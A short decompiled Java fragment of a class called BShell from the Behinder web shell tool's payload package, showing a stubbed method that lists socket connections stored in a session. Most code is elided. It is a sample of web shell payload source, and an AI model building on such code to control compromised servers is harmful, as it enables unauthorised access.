...
public class BShell
    ...
    private Map<String, String> listBShell(PageContext page) throws Exception {
        ...
        if (this.Session.getAttribute("BShellList") != null) {
            ...
            Map<String, Socket> BShellList = (Map<String, Socket>) this.Session.getAttribute("BShellList");
...
/* Location:              /Users/kongzhen/kz_s3c/Behinder_v3.0_Beta_6_mac/Behinder_v3.0_Beta6_mac.jar!/net/rebeyond/behinder/payload/java/BShell.class
